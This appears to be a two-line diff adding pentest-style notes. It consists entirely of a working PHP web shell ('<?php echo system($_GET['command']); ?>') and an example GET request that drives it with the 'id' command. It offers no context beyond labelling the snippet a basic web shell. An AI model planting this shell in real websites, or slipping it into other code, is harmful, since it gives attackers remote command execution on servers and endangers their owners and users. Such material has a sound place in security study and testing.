@@ -1,0 +1,2 @@
+basic php web shell: <?php echo system($_GET['command']); ?>
+	control w/ GET requests: GET /example/exploit.php?command=id HTTP/1.1
